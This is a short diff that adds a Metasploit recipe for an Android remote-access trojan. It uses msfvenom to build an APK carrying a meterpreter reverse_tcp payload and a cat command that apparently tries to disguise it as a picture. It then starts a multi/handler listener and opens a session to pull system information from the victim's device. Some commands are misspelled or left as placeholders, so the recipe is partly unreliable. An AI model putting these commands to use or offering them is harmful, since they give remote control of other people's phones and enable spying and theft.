@@ -1,0 +1,8 @@
+msfvenom -p android/meterpreter/reverse_tcp LHOST=Localhost IP LPORT=4535 R >name.apk
+chmod 777 name.apk
+cat picture.jpg rose.jpg > san.apk
+chmod 777 san.apk
+use exploit/multi/handler
+run
+session -i
+system info
